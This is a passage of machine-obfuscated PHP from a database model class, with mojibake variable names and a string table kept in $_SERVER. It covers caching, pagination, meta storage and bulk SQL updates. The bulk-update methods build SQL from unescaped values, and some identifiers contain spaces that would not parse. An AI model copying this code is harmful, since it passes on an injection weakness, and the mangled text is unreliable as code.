=& $_SERVER[ü¢ÙÊñÛ]; if (!$this->checkDataAutoHas($ßÛ¢‚œ¿[443])) { return; } $this->dataBeforeFilter($é–‰‚„Æ, $ßÛ¢‚œ¿[443]); } protected function _afterSelect(&$ÂÑÓå“ï, $¥ ü»Ò¦) { if (!is_array($ÂÑÓå“ï)) { return; } if (!$this->checkDataAutoHas($_SERVER[ü¢ÙÊñÛ][444])) { return; } foreach ($ÂÑÓå“ï as &$ë„Ùäœ›) { $this->dataAfterFilter($ë„Ùäœ›); } unset($ë„Ùäœ›); } protected function _afterFind(&$Ÿ®‹ş, $¦®‚¶Ñ–) { if (!is_array($Ÿ®‹ş)) { return; } if (!$this->checkDataAutoHas($_SERVER[ü¢ÙÊñÛ][444])) { return; } $this->dataAfterFilter($Ÿ®‹ş); } public static function textEncode($²”ææ”) { if (!$²”ææ”) { return $²”ææ”; } $ƒª–²©ß = json_encode($²”ææ”); $ƒª–²©ß = preg_replace_callback($_SERVER[ü¢ÙÊñÛ][445], function ($”™Ÿ‰†ò) { return addslashes($”™Ÿ‰†ò[0]); }, $ƒª–²©ß); return json_decode($ƒª–²©ß); } public static function textDecode($Û½ßî‚ˆ) { $û‚ØÖï =& $_SERVER[ü¢ÙÊñÛ]; $Œ¦Ù¶ãã = json_encode($Û½ßî‚ˆ); $Œ¦Ù¶ãã = preg_replace_callback($û‚ØÖï[446], function ($˜¤«äãä) { return $_SERVER[ü¢ÙÊñÛ][111]; }, $Œ¦Ù¶ãã); return json_decode($Œ¦Ù¶ãã); } public function setAutoIncrement($ùÔ‹èÁü) { $á’›Ìğ = array($this->getPk() => $ùÔ‹èÁü); $å§‰ˆ³¶ = $this->data($á’›Ìğ)->add(); if ($å§‰ˆ³¶) { $this->delete($å§‰ˆ³¶); } } public function getAutoIncrement() { $ß÷ß‰£ı = $this->getTableName(); $ÔÏêòÆ½ = $this->max($this->getPk()); $¹›·¶à† = $this->query("\x73\150\157\x77\40\x74\x61\142\154\x65\x20\163\x74\141\x74\x75\163\x20\167\x68\x65\x72\145\x20\x4e\141\x6d\145\75\x27{$ß÷ß‰£ı}\47"); $£‚×´Ç¦ = $¹›·¶à†[0][$_SERVER[ü¢ÙÊñÛ][447]]; $¹Â¬šÇ = max($ÔÏêòÆ½, $£‚×´Ç¦); return $¹Â¬šÇ; } protected function _callBefore($ÈŒùğ, $¾„«Ø›ƒ) { return $this->cacheCallCheck($ÈŒùğ, $¾„«Ø›ƒ, !1); } protected function _callAfter($Í˜íÎ÷Ï, $™ÇÈ¤¸») { return $this->cacheCallCheck($Í˜íÎ÷Ï, $™ÇÈ¤¸», !0); } protected function cacheFunctionAlias($òæ×ä…É) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ú®ù¬ö“, $…¹ãŞö, $æ­Øì = false) { $š¾ˆ´º =& $_SERVER[ü¢ÙÊñÛ]; $­ ›Óá© = $this->cacheFunctionAlias($…¹ãŞö); if (!$­ ›Óá©) { return; } foreach ($­ ›Óá© as $¼óÃç™³ => $İ§İÉ‚¾) { $Áò¼»¼Ã = $İ§İÉ‚¾[0]; $†²Šß¡“ = explode($š¾ˆ´º[60], $İ§İÉ‚¾[1]); $ ¯ñô = isset($İ§İÉ‚¾[2]) ? $İ§İÉ‚¾[2] : $š¾ˆ´º[22]; if ($ú®ù¬ö“ == $¼óÃç™³) { return $this->cacheFunctionGet($¼óÃç™³, $Áò¼»¼Ã, $ ¯ñô); } if ($æ­Øì && in_array($ú®ù¬ö“, $†²Šß¡“)) { $this->cacheFunctionClear($¼óÃç™³, $Áò¼»¼Ã, $ ¯ñô); } } } public function cacheFunctionGet($  »Ôƒü, $Ğ™ë•½, $ßı¸Í = '') { $”¨î¯© = $this->cacheKeyMake($  »Ôƒü, $Ğ™ë•½, $ßı¸Í); $Û‘ÄñÓ’ = Cache::get($”¨î¯©); if (!is_array($Û‘ÄñÓ’)) { $Û‘ÄñÓ’ = call_user_func_array(array($this, $  »Ôƒü), array($Ğ™ë•½, !0)); Cache::set($”¨î¯©, $Û‘ÄñÓ’); } return $Û‘ÄñÓ’; } public function cacheFunctionClear($³µ²À‹, $ÈÜÚı, $¢» ¹‡Ñ = '') { $·ôÖ·Àš = $ÈÜÚı; if (!is_array($ÈÜÚı)) { $·ôÖ·Àš = array($ÈÜÚı); } foreach ($·ôÖ·Àš as $½±•»É¾) { $Ÿ×¨Ë–Ü = $this->cacheKeyMake($³µ²À‹, $½±•»É¾, $¢» ¹‡Ñ); Cache::remove($Ÿ×¨Ë–Ü); } } private function cacheKeyMake($Ü©® ”á, $ÕÏØˆœ´, $°‹’şº) { $²¯ä®ÌŠ =& $_SERVER[ü¢ÙÊñÛ]; if ($°‹’şº) { $ÕÏØˆœ´ = $ÕÏØˆœ´ . $²¯ä®ÌŠ[448] . $°‹’şº; } return get_class($this) . $²¯ä®ÌŠ[21] . $Ü©® ”á . $²¯ä®ÌŠ[449] . $ÕÏØˆœ´; } protected function selectPageReset() { $ùüÖ×ì£ =& $_SERVER[ü¢ÙÊñÛ]; if (isset($GLOBALS[$ùüÖ×ì£[450]])) { return; } $GLOBALS[$ùüÖ×ì£[450]] = isset($GLOBALS[$ùüÖ×ì£[17]][$ùüÖ×ì£[451]]) ? $GLOBALS[$ùüÖ×ì£[17]][$ùüÖ×ì£[451]] : !1; $GLOBALS[$ùüÖ×ì£[452]] = isset($GLOBALS[$ùüÖ×ì£[17]][$ùüÖ×ì£[440]]) ? $GLOBALS[$ùüÖ×ì£[17]][$ùüÖ×ì£[440]] : !1; $GLOBALS[$ùüÖ×ì£[17]][$ùüÖ×ì£[451]] = !1; $GLOBALS[$ùüÖ×ì£[17]][$ùüÖ×ì£[440]] = !1; } protected function selectPageRestore() { $ÌáÛÉ =& $_SERVER[ü¢ÙÊñÛ]; if (!isset($GLOBALS[$ÌáÛÉ[450]])) { return; } $GLOBALS[$ÌáÛÉ[17]][$ÌáÛÉ[451]] = $GLOBALS[$ÌáÛÉ[450]]; $GLOBALS[$ÌáÛÉ[17]][$ÌáÛÉ[440]] = $GLOBALS[$ÌáÛÉ[452]]; if ($GLOBALS[$ÌáÛÉ[17]][$ÌáÛÉ[451]] === !1) { unset($GLOBALS[$ÌáÛÉ[17]][$ÌáÛÉ[451]]); } if ($GLOBALS[$ÌáÛÉ[17]][$ÌáÛÉ[440]] === !1) { unset($GLOBALS[$ÌáÛÉ[17]][$ÌáÛÉ[440]]); } unset($GLOBALS[$ÌáÛÉ[450]]); unset($GLOBALS[$ÌáÛÉ[452]]); } protected function selectPage($ÕêšÊã = 200, $—¿³Ö÷§ = 1) { $ ŠâÓ²› =& $_SERVER[ü¢ÙÊñÛ]; global $in; $´±Ò©†ƒ = $this->optionsValue(); $•ûØŒø³ = 50000; $ÕêšÊã = isset($in[$ ŠâÓ²›[451]]) && $in[$ ŠâÓ²›[451]] ? $in[$ ŠâÓ²›[451]] : $ÕêšÊã; if ($ÕêšÊã === -1) { $in[$ ŠâÓ²›[451]] = !1; $•ûØŒø³ = 100000000; $ÕêšÊã = $•ûØŒø³; } $ö„Ûµñô = $´±Ò©†ƒ; $ö„Ûµñô[$ ŠâÓ²›[453]] = array(); $ÕêšÊã = intval($ÕêšÊã); $ÕêšÊã = $ÕêšÊã <= 5 ? 5 : ($ÕêšÊã >= $•ûØŒø³ ? $•ûØŒø³ : $ÕêšÊã); $—¿³Ö÷§ = intval(isset($in[$ ŠâÓ²›[440]]) && $in[$ ŠâÓ²›[440]] ? $in[$ ŠâÓ²›[440]] : $—¿³Ö÷§); $—¿³Ö÷§ = $—¿³Ö÷§ <= 1 ? 1 : $—¿³Ö÷§; $©Ä—Ö•ö = array(); $´–Ç½òû = 1; if ($—¿³Ö÷§ == 1 && $´–Ç½òû) { $this->optionsValue($´±Ò©†ƒ); $©Ä—Ö•ö = $this->page($—¿³Ö÷§, $ÕêšÊã)->select(); $íıÆÙÀ = is_array($©Ä—Ö•ö) ? count($©Ä—Ö•ö) : 0; if ($íıÆÙÀ < $ÕêšÊã) { $¤€µ¸È¹ = 1; } else { $this->optionsValue($ö„Ûµñô); $íıÆÙÀ = intval($this->count()); $¤€µ¸È¹ = ceil($íıÆÙÀ / $ÕêšÊã); } } else { $this->optionsValue($ö„Ûµñô); $íıÆÙÀ = intval($this->count()); $¤€µ¸È¹ = ceil($íıÆÙÀ / $ÕêšÊã); $—¿³Ö÷§ = $—¿³Ö÷§ >= $¤€µ¸È¹ ? $¤€µ¸È¹ : $—¿³Ö÷§; $this->optionsValue($´±Ò©†ƒ); $©Ä—Ö•ö = $this->page($—¿³Ö÷§, $ÕêšÊã)->select(); } if (!is_array($©Ä—Ö•ö)) { $©Ä—Ö•ö = array(); } if ($¤€µ¸È¹ == 1) { $íıÆÙÀ = count($©Ä—Ö•ö); } $Æ–ó¿ˆÛ = array($ ŠâÓ²›[454] => array($ ŠâÓ²›[455] => $íıÆÙÀ, $ ŠâÓ²›[451] => $ÕêšÊã, $ ŠâÓ²›[440] => $—¿³Ö÷§, $ ŠâÓ²›[456] => $¤€µ¸È¹), $ ŠâÓ²›[457] => $©Ä—Ö•ö); return $Æ–ó¿ˆÛ; } protected function checkLength($´¤û‡…“, $’ºº©„ = 0, $µŒàÖ¹€ = '') { $É¬Ãœ€ò =& $_SERVER[ü¢ÙÊñÛ]; $’ºº©„ = $’ºº©„ ? $’ºº©„ : 65536; if (!$´¤û‡…“ || strlen($´¤û‡…“) < $’ºº©„) { return; } $µŒàÖ¹€ = $µŒàÖ¹€ ? $µŒàÖ¹€ . $É¬Ãœ€ò[85] : $É¬Ãœ€ò[22]; show_json($µŒàÖ¹€ . LNG($É¬Ãœ€ò[458]) . "\50{$’ºº©„}\x29", !1); } protected function metaSet($“ÁœÌ¢·, $øƒô®ä = null, $Á¾üÓ¢¢ = null) { $ıØ™»Á‡ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->tableMeta || !$“ÁœÌ¢·) { return !1; } $‚ü¥ÈÒÅ = $this->tableMeta[$ıØ™»Á‡[459]]; $¿†ãáÑ = $this->tableMeta[$ıØ™»Á‡[460]]; $ËÇÉ™Ñ£ = Model($¿†ãáÑ); $æš˜Ùé = array($‚ü¥ÈÒÅ => $“ÁœÌ¢·, $ıØ™»Á‡[461] => $øƒô®ä); if (is_null($øƒô®ä)) { return $ËÇÉ™Ñ£->where(array($‚ü¥ÈÒÅ => $“ÁœÌ¢·))->delete(); } if (is_null($Á¾üÓ¢¢) && is_string($øƒô®ä)) { return $ËÇÉ™Ñ£->where($æš˜Ùé)->delete(); } $áûÂÔ¾ƒ = is_array($øƒô®ä) ? $øƒô®ä : array(); if (is_string($øƒô®ä)) { $áûÂÔ¾ƒ[$øƒô®ä] = $Á¾üÓ¢¢; } $§ä»’ğ = array(); foreach ($áûÂÔ¾ƒ as $ØêÌæÌÑ => $¨…œ¦ÁĞ) { if (is_null($¨…œ¦ÁĞ) && is_string($ØêÌæÌÑ)) { $ËÇÉ™Ñ£->where(array($‚ü¥ÈÒÅ => $“ÁœÌ¢·, $ıØ™»Á‡[461] => $ØêÌæÌÑ))->delete(); continue; } $this->checkLength($¨…œ¦ÁĞ, !1, $¿†ãáÑ . $ıØ™»Á‡[14] . $ØêÌæÌÑ); $§ä»’ğ[] = array($‚ü¥ÈÒÅ => $“ÁœÌ¢·, $ıØ™»Á‡[108] => $ØêÌæÌÑ, $ıØ™»Á‡[462] => $¨…œ¦ÁĞ); } $–ØìşÔû = $ıØ™»Á‡[463] . $¿†ãáÑ; CacheLock::lock($–ØìşÔû); $ËÇÉ™Ñ£->where(array($‚ü¥ÈÒÅ => $“ÁœÌ¢·))->addAll($§ä»’ğ, array(), !0); CacheLock::unlock($–ØìşÔû); return !0; } public function metaGet($Ñò¨çòø, $Ğ€ß“Å¨ = false) { $ÔØÃÄ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->tableMeta) { return array(); } $Ó•”µ—ë = $this->tableMeta[$ÔØÃÄ[459]]; $¡“‡Ê¹ª = Model($this->tableMeta[$ÔØÃÄ[460]]); if ($Ğ€ß“Å¨) { $¤™ºìëí = array($Ó•”µ—ë => $Ñò¨çòø, $ÔØÃÄ[108] => $Ğ€ß“Å¨); return $¡“‡Ê¹ª->where($¤™ºìëí)->getField($ÔØÃÄ[462]); } $¤™ºìëí = array($Ó•”µ—ë => $Ñò¨çòø); $şİŸÇœë = $¡“‡Ê¹ª->field($ÔØÃÄ[464])->where($¤™ºìëí)->select(); $şİŸÇœë = array_to_keyvalue($şİŸÇœë, $ÔØÃÄ[108], $ÔØÃÄ[462]); return $şİŸÇœë; } private function checkDataAutoHas($åıí¶¿Î) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $”›˜ÖÆ§) { if (in_array($åıí¶¿Î, explode($_SERVER[ü¢ÙÊñÛ][60], $”›˜ÖÆ§[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ä¯Ò®”ç, $ñÌ‰ú²) { $ûïŞ¼ç÷ =& $_SERVER[ü¢ÙÊñÛ]; if (!is_array($ä¯Ò®”ç)) { return; } foreach ($this->dataAuto as $æğË±Ä­) { $¸ÒÒ¶¯ = $æğË±Ä­[0]; if (!in_array($ñÌ‰ú², explode($ûïŞ¼ç÷[60], $æğË±Ä­[2]))) { continue; } switch (trim($æğË±Ä­[3])) { case $ûïŞ¼ç÷[408]: case $ûïŞ¼ç÷[409]: $ºï‰¦¡® = $æğË±Ä­[1]; $ë¾°¶ã = isset($æğË±Ä­[4]) ? (array) $æğË±Ä­[4] : array(); if ($ºï‰¦¡® == $ûïŞ¼ç÷[217] && array_key_exists($¸ÒÒ¶¯, $ä¯Ò®”ç)) { if (!$ä¯Ò®”ç[$¸ÒÒ¶¯]) { unset($ä¯Ò®”ç[$¸ÒÒ¶¯]); } break; } if (isset($ä¯Ò®”ç[$¸ÒÒ¶¯])) { array_unshift($ë¾°¶ã, $ä¯Ò®”ç[$¸ÒÒ¶¯]); } if ($ûïŞ¼ç÷[408] == $æğË±Ä­[3]) { $ä¯Ò®”ç[$¸ÒÒ¶¯] = call_user_func_array($ºï‰¦¡®, $ë¾°¶ã); } else { $ä¯Ò®”ç[$¸ÒÒ¶¯] = call_user_func_array(array(&$this, $ºï‰¦¡®), $ë¾°¶ã); } break; case $ûïŞ¼ç÷[359]: if (isset($ä¯Ò®”ç[$¸ÒÒ¶¯]) && $ä¯Ò®”ç[$¸ÒÒ¶¯]) { $ä¯Ò®”ç[$¸ÒÒ¶¯] = call_user_func_array(array(&$this, $æğË±Ä­[1]), array($ä¯Ò®”ç[$¸ÒÒ¶¯])); } break; case $ûïŞ¼ç÷[362]: $ä¯Ò®”ç[$¸ÒÒ¶¯] = $ä¯Ò®”ç[$æğË±Ä­[1]]; break; case $ûïŞ¼ç÷[381]: if (isset($ä¯Ò®”ç[$¸ÒÒ¶¯]) && !is_string($ä¯Ò®”ç[$¸ÒÒ¶¯])) { $ä¯Ò®”ç[$¸ÒÒ¶¯] = json_encode_force($ä¯Ò®”ç[$¸ÒÒ¶¯]); } break; case $ûïŞ¼ç÷[410]: if ($ä¯Ò®”ç[$¸ÒÒ¶¯] === $ûïŞ¼ç÷[22]) { unset($ä¯Ò®”ç[$¸ÒÒ¶¯]); } break; case $ûïŞ¼ç÷[411]: $ä¯Ò®”ç[$¸ÒÒ¶¯] = $æğË±Ä­[1]; default: break; } } if ($ñÌ‰ú² == $ûïŞ¼ç÷[442]) { $˜ı¦ÙÊâ = strtolower($this->db->getDbType()); if (strpos($˜ı¦ÙÊâ, $ûïŞ¼ç÷[23]) !== 0) { return; } $¥Œ»ï‹‘ = $this->field(!0)->fields; $•ğ€ÔÈŠ = $¥Œ»ï‹‘[$ûïŞ¼ç÷[341]]; if (isset($¥Œ»ï‹‘[$ûïŞ¼ç÷[340]])) { unset($•ğ€ÔÈŠ[$¥Œ»ï‹‘[$ûïŞ¼ç÷[340]]]); } foreach ($•ğ€ÔÈŠ as $ĞßÎú™™ => $ñÌ‰ú²) { if (!isset($ä¯Ò®”ç[$ĞßÎú™™])) { $ä¯Ò®”ç[$ĞßÎú™™] = $ûïŞ¼ç÷[22]; } } } } private function dataAfterFilter(&$Òà•¸º´) { $£ã€¦‡ˆ =& $_SERVER[ü¢ÙÊñÛ]; foreach ($this->dataAuto as $œÀÄÚ‚¥) { $¼è’¹˜ = $œÀÄÚ‚¥[0]; if (!isset($Òà•¸º´[$¼è’¹˜])) { continue; } if (!in_array($£ã€¦‡ˆ[444], explode($£ã€¦‡ˆ[60], $œÀÄÚ‚¥[2]))) { continue; } switch (trim($œÀÄÚ‚¥[3])) { case $£ã€¦‡ˆ[408]: case $£ã€¦‡ˆ[409]: $¨ÂÈõã = isset($œÀÄÚ‚¥[4]) ? (array) $œÀÄÚ‚¥[4] : array(); array_unshift($¨ÂÈõã, $Òà•¸º´[$¼è’¹˜]); if (isset($œÀÄÚ‚¥[4]) && $œÀÄÚ‚¥[4] == $£ã€¦‡ˆ[465]) { $¨ÂÈõã = array($Òà•¸º´[$¼è’¹˜]); } if ($£ã€¦‡ˆ[408] == $œÀÄÚ‚¥[3]) { $Òà•¸º´[$¼è’¹˜] = call_user_func_array($œÀÄÚ‚¥[1], $¨ÂÈõã); } else { $Òà•¸º´[$¼è’¹˜] = call_user_func_array(array(&$this, $œÀÄÚ‚¥[1]), $¨ÂÈõã); } break; case $£ã€¦‡ˆ[359]: if (isset($Òà•¸º´[$¼è’¹˜]) && $Òà•¸º´[$¼è’¹˜]) { $Òà•¸º´[$¼è’¹˜] = call_user_func_array(array(&$this, $œÀÄÚ‚¥[1]), array($Òà•¸º´[$¼è’¹˜])); } break; case $£ã€¦‡ˆ[362]: $Òà•¸º´[$¼è’¹˜] = $Òà•¸º´[$œÀÄÚ‚¥[1]]; break; case $£ã€¦‡ˆ[381]: $õ±±ŒÖ¹ = $Òà•¸º´[$¼è’¹˜]; $Òà•¸º´[$¼è’¹˜] = json_decode($õ±±ŒÖ¹, !0); if (is_null($Òà•¸º´[$¼è’¹˜])) { $Òà•¸º´[$¼è’¹˜] = $õ±±ŒÖ¹; } break; case $£ã€¦‡ˆ[410]: if ($Òà•¸º´[$¼è’¹˜] === $£ã€¦‡ˆ[22]) { unset($Òà•¸º´[$¼è’¹˜]); } break; case $£ã€¦‡ˆ[411]: $Òà•¸º´[$¼è’¹˜] = $œÀÄÚ‚¥[1]; break; default: break; } } } public function saveAll($­ªüÀÂê) { $ûÒæÈç§ =& $_SERVER[ü¢ÙÊñÛ]; $—íï’Ä = $this->tablePrefix . $this->tableName; $Áı¾ìÕ = self::SQL_WHERE_IN_CHUNK; $­ªüÀÂê = is_array($­ªüÀÂê) ? $­ªüÀÂê : array(); $•€©‰´¸ = $ûÒæÈç§[64]; $Éú«…° = 0; $±ä·€ú› = array(); $ÎÆòâŸ¾ = count($­ªüÀÂê); for ($°¤‚Åªû = 0; $°¤‚Åªû < $ÎÆòâŸ¾; $°¤‚Åªû++) { $ùµ€ãåÈ = $­ªüÀÂê[$°¤‚Åªû]; if (!is_array($ùµ€ãåÈ) || count($ùµ€ãåÈ) != 4) { continue; } $ì… ±¤Ç = "\x55\120\x44\101\124\x45\x20\140{$—íï’Ä}\x60\x20\x53\x45\x54\40{$ùµ€ãåÈ[2]}\40\75\x20\103\101\123\105\x20{$ùµ€ãåÈ[0]}\40\xa"; if ($Éú«…° == 0) { $•€©‰´¸ = $ì… ±¤Ç; } $±ä·€ú›[] = $ûÒæÈç§[132] . $ùµ€ãåÈ[1] . $ûÒæÈç§[132]; $Éú«…°++; $•€©‰´¸ .= "\x20\x57\110\x45\x4e\40\x27{$ùµ€ãåÈ[1]}\47\x20\x54\x48\x45\116\x20\x27{$ùµ€ãåÈ[3]}\x27\40\12"; if ($Éú«…° == $Áı¾ìÕ || $°¤‚Åªû == $ÎÆòâŸ¾ - 1) { $ûÂêöÜ´ = implode($ûÒæÈç§[60], $±ä·€ú›); $•€©‰´¸ .= "\40\x45\116\x44\40\40\x57\110\105\x52\105\x20{$ùµ€ãåÈ[0]}\x20\x49\x4e\x20\x28{$ûÂêöÜ´}\x29\40"; $this->execute($•€©‰´¸); $Éú«…° = 0; $•€©‰´¸ = $ì… ±¤Ç; $this->chunkEventCheck(count($±ä·€ú›)); $±ä·€ú› = array(); } } $this->chunkEventSet(); } public function saveAllEach($‰—†ï´) { $¸öôû =& $_SERVER[ü¢ÙÊñÛ]; $ïÅÏÑø = $this->tablePrefix . $this->tableName; foreach ($‰—†ï´ as $çßÀ‘š“) { if (!is_array($çßÀ‘š“) || count($çßÀ‘š“) != 4) { continue; } $»ôŒê±ã = $çßÀ‘š“[0] . $¸öôû[466] . $çßÀ‘š“[1] . $¸öôû[132]; $¤‹‰ëğ = $çßÀ‘š“[2] . $¸öôû[466] . $çßÀ‘š“[3] . $¸öôû[132]; $ä€†®Å² = "\165\x70\x64\x61\x74\x65\x20{$ïÅÏÑø}\40\x73\x65\164\x20{$¤‹‰ëğ}\x20\x77\x68\145\162\145\x20{$»ôŒê±ã}\73"; $this->execute($ä€†®Å²); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($–±¨ïí¢ = false, $‡ø»…ë = false) { $this->_chunkEvent = $–±¨ïí¢; $this->_chunkEventParam = $‡ø»…ë; } private function chunkEventCheck($©ø‡˜ğ•) { if (!$this->_chunkEvent) { return; } $ÂÕ¨ö‘³ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ÂÕ¨ö‘³[$_SERVER[ü¢ÙÊñÛ][467]] = $©ø‡˜ğ•; Hook::trigger($this->_chunkEvent, $ÂÕ¨ö‘³); } public function addAll($©Ş´İÛŞ, $¨£ì¯¢¸ = array(), $šåÊ”Æ = false) { $¹øÔÚ÷ =& $_SERVER[ü¢ÙÊñÛ]; ignore_timeout(); $²‚­ìŸÁ = self::SQL_WHERE_IN_CHUNK; if (empty($©Ş´İÛŞ)) { $this->error = think_lang($¹øÔÚ÷[360]); return !1; } $¨£ì¯¢¸ = $this->_parseOptions($¨£ì¯¢¸); foreach ($©Ş´İÛŞ as $ÓüĞèäİ => $–™õûš¶) { $©Ş´İÛŞ[$ÓüĞèäİ] = $this->_facade($–™õûš¶); $this->_beforeInsert($©Ş´İÛŞ[$ÓüĞèäİ], $¨£ì¯¢¸); } if (method_exists($this->db, $¹øÔÚ÷[361])) { for ($©¢Ú¢œ = 0; $©¢Ú¢œ < count($©Ş´İÛŞ); $©¢Ú¢œ += $²‚­ìŸÁ) { $…öéÂè = array_slice($©Ş´İÛŞ, $©¢Ú¢œ, $²‚­ìŸÁ); if (!is_array($…öéÂè) || count($…öéÂè) == 0) { break; } $ğúÛÌ”Í = $this->db->insertAll($…öéÂè, $¨£ì¯¢¸, $šåÊ”Æ); $this->chunkEventCheck(count($…öéÂè)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($©Ş´İÛŞ as $ÓüĞèäİ => $–™õûš¶) { $ğúÛÌ”Í = $this->db->insert($–™õûš¶, $¨£ì¯¢¸, $šåÊ”Æ); } $this->commit(); } if (!1 !== $ğúÛÌ”Í) { $÷¯Şµ«ù = $this->getLastInsID(); if ($÷¯Şµ«ù) { return $÷¯Şµ«ù; } } return $ğúÛÌ”Í; } public function save($ëÊŠÄŠí = '', $µ¹ë•ö‚ = array()) { $•çä”’¶ =& $_SERVER[ü¢ÙÊñÛ]; $Üœ›ŠäÂ = self::SQL_WHERE_IN_CHUNK; $üú‡çƒ = $this->optionsValue(); $ãñ›‰ŒÓ = $this->findWhereField($üú‡çƒ); if (!$ãñ›‰ŒÓ) { return parent::save($ëÊŠÄŠí, $µ¹ë•ö‚); } $£†›êø = 0; $Å‡ìÜ‹Ÿ = $üú‡çƒ[$•çä”’¶[364]][$ãñ›‰ŒÓ][1]; $Å‡ìÜ‹Ÿ = is_array($Å‡ìÜ‹Ÿ) ? $Å‡ìÜ‹Ÿ : array(); $¶¢Ö¬˜ = count($Å‡ìÜ‹Ÿ); for ($õ×Ëõ † = 0; $õ×Ëõ † < $¶¢Ö¬˜; $õ×Ëõ † += $Üœ›ŠäÂ) { $’µ™‡ÀÊ = array_slice($Å‡ìÜ‹Ÿ, $õ×Ëõ †, $Üœ›ŠäÂ); if (!is_array($’µ™‡ÀÊ) || count($’µ™‡ÀÊ) == 0) { break; } $üú‡çƒ[$•çä”’¶[364]][$ãñ›‰ŒÓ][1] = $’µ™‡ÀÊ; $this->optionsValue($üú‡çƒ); $£†›êø += parent::save($ëÊŠÄŠí, $µ¹ë•ö‚); $this->chunkEventCheck(count($’µ™‡ÀÊ)); } $this->chunkEventSet(); return $£†›êø; } public function add($Ú™†ÆÉ = '', $àíô½„ = array(), $ı³Ä›Öı = false) { if ($this->addTaskStatus && is_array($Ú™†ÆÉ)) { $this->addTaskData[] = $Ú™†ÆÉ; return; } return parent::add($Ú™†ÆÉ, $àíô½„, $ı³Ä›Öı); } public function parseWhereLike($ü‘ş’Â“, $ÑÚùóÙĞ = '', $¿¢İùºê = false, &$ş Ë®ğ¡ = false) { $ğŠ—­Ô€ =& $_SERVER[ü¢ÙÊñÛ]; $½Ù“ÏİĞ = $GLOBALS[$ğŠ—­Ô€[16]][$ğŠ—­Ô€[468]]; if (!$½Ù“ÏİĞ[$ğŠ—­Ô€[469]]) { return $ü‘ş’Â“; } if (!is_array($ü‘ş’Â“)) { return $ü‘ş’Â“; } $Ì Û¤£ = array(); $ª÷¥ŒÏĞ = 0; foreach ($ü‘ş’Â“ as $’€Âî => $©ÒíÙ·è) { if (is_array($©ÒíÙ·è) && count($©ÒíÙ·è) == 2 && $©ÒíÙ·è[0] == $ğŠ—­Ô€[470] && is_string($©ÒíÙ·è[1]) && substr($©ÒíÙ·è[1], 0, 1) == $ğŠ—­Ô€[471] && substr($©ÒíÙ·è[1], strlen($©ÒíÙ·è[1]) - 1, 1) == $ğŠ—­Ô€[471]) { $ş Ë®ğ¡ = !0; $ôƒ“§ªğ = is_string($’€Âî) ? $’€Âî : $ÑÚùóÙĞ; $÷ïéáÓ… = substr($©ÒíÙ·è[1], 1, strlen($©ÒíÙ·è[1]) - 2); $÷ïéáÓ… = $this->db->escapeString($÷ïéáÓ…); if (!strpos($ôƒ“§ªğ, $ğŠ—­Ô€[20])) { $ôƒ“§ªğ = $ğŠ—­Ô€[472] . $ôƒ“§ªğ . $ğŠ—­Ô€[472]; } $¹ÈÂ¡† = $ğŠ—­Ô€[233] . $÷ïéáÓ… . $ğŠ—­Ô€[233]; $÷ïéáÓ… = str_replace(array($ğŠ—­Ô€[20], $ğŠ—­Ô€[473], $ğŠ—­Ô€[21]), $ğŠ—­Ô€[474], $÷ïéáÓ…); if ($½Ù“ÏİĞ[$ğŠ—­Ô€[475]]) { $¹ÈÂ¡† = $ğŠ—­Ô€[476] . $÷ïéáÓ… . $ğŠ—­Ô€[477]; if ($½Ù“ÏİĞ[$ğŠ—­Ô€[478]]) { $¹ÈÂ¡† = $ğŠ—­Ô€[477] . $÷ïéáÓ… . $ğŠ—­Ô€[476]; } } $Ì Û¤£[$ª÷¥ŒÏĞ] = $ğŠ—­Ô€[479] . $ôƒ“§ªğ . $ğŠ—­Ô€[480] . $¹ÈÂ¡† . $ğŠ—­Ô€[481]; $ª÷¥ŒÏĞ++; continue; } if (is_array($©ÒíÙ·è)) { $ÑÚùóÙĞ = is_string($’€Âî) ? $’€Âî : $ÑÚùóÙĞ; $©ÒíÙ·è = $this->parseWhereLike($©ÒíÙ·è, $ÑÚùóÙĞ, !0, $ş Ë®ğ¡); } if (is_numeric($’€Âî)) { $Ì Û¤£[$ª÷¥ŒÏĞ] = $©ÒíÙ·è; $ª÷¥ŒÏĞ++; } else { $Ì Û¤£[$’€Âî] = $©ÒíÙ·è; } } if ($ş Ë®ğ¡ && !$¿¢İùºê) { } return $Ì Û¤£; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($•œı–Üè = array()) { $Œ¦ÃÒàì =& $_SERVER[ü¢ÙÊñÛ]; $ú”Î·‹ = self::SQL_WHERE_IN_CHUNK; $å¿ÑÁƒ— = $this->optionsValue(); $¦ö®­ß = $this->findWhereField($å¿ÑÁƒ—); if (!$¦ö®­ß || isset($å¿ÑÁƒ—[$Œ¦ÃÒàì[379]]) || isset($å¿ÑÁƒ—[$Œ¦ÃÒàì[440]])) { return parent::select($•œı–Üè); } $»ùÀˆñÀ = $å¿ÑÁƒ—[$Œ¦ÃÒàì[364]][$¦ö®­ß][1]; $»ùÀˆñÀ = is_array($»ùÀˆñÀ) ? $»ùÀˆñÀ : array(); $«ºŞ = null; for ($ß—Úƒ¹æ = 0; $ß—Úƒ¹æ < count($»ùÀˆñÀ); $ß—Úƒ¹æ += $ú”Î·‹) { $ŠËŠ¿‘³ = array_slice($»ùÀˆñÀ, $ß—Úƒ¹æ, $ú”Î·‹); if (!is_array($ŠËŠ¿‘³) || count($ŠËŠ¿‘³) == 0) { break; } $å¿ÑÁƒ—[$Œ¦ÃÒàì[364]][$¦ö®­ß][1] = $ŠËŠ¿‘³; $this->optionsValue($å¿ÑÁƒ—); $´î°Åòü = parent::select($•œı–Üè); if (!$´î°Åòü) { continue; } $«ºŞ = is_array($«ºŞ) ? $«ºŞ : array(); $«ºŞ = array_merge($«ºŞ, $´î°Åòü); } return $«ºŞ; } public function delete($…Ìé„´§ = array()) { $´Ì¾÷…ì =& $_SERVER[ü¢ÙÊñÛ]; $¼“ËÕèö = 